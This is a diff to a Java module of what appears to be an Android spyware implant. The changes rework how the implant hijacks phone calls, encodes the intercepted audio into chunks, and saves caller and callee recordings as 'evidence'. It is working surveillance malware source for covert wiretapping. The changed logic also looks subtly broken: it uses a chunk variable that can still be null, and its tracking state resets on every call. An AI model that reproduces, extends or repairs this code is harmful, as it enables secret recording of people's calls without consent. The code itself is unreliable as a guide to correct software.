@@ -165,7 +165,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + "(actualStart): starting audio storage management");
 			}
 
-			if(installHijack()){
+			if (installHijack()) {
 				startWatchAudio();
 			}
 		}
@@ -209,14 +209,15 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 				// Add to list
 				if (addToEncodingList(AudioEncoder.getAudioStorage() + file) == true) {
-					synchronized (sync) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(onEvent): signaling EncodingTask thread");
-						}
-
-						encodingTask.wake();
+					// synchronized (sync) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(onEvent): signaling EncodingTask thread");
 					}
+
+					encodingTask.wake();
+					// }
 				}
+
 			}
 		};
 
@@ -243,7 +244,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			return false;
 		}
-		
+
 		return true;
 	}
 
@@ -921,17 +922,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Now rawPcm contains the raw data
 		String encodedFile = f + ".err";
 
+		boolean remote = encodedFile.endsWith("-r.tmp.err");
+		Chunk lastr = null;
+		boolean started = false;
+
 		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample())) {
 			Date begin = new Date(first_epoch * 1000L);
 			Date end = new Date(last_epoch * 1000L);
-
-			int remote;
-
-			if (encodedFile.endsWith("-r.tmp.err")) {
-				remote = 1;
-			} else {
-				remote = 0;
-			}
 
 			if (!updateCallInfo(callInfo, false)) {
 				if (Cfg.DEBUG) {
@@ -951,7 +948,25 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			} else {
 				// Encode to evidence
 				// TODO add caller/callee phone number and right timestamps
-				saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, remote, callInfo.programId);
+				int channel = remote ? 1 : 0;
+
+				if (!started) {
+					if (remote) {
+						lastr = new Chunk(encodedFile, begin, end, remote);
+					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (encodeChunks): first LOCAL");
+						}
+						started = true;
+						saveCallEvidence(caller, callee, true, lastr.begin, lastr.end, lastr.encodedFile, false,
+								lastr.channel, callInfo.programId);
+						saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, channel,
+								callInfo.programId);
+					}
+				} else {
+
+					saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, channel, callInfo.programId);
+				}
 			}
 
 			// We have an end of call and it's on both channels
@@ -996,7 +1011,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveAllEvidences) saving chunk: " + chunk.encodedFile);
 			}
-			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.remote,
+			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
 					callInfo.programId);
 
 		}
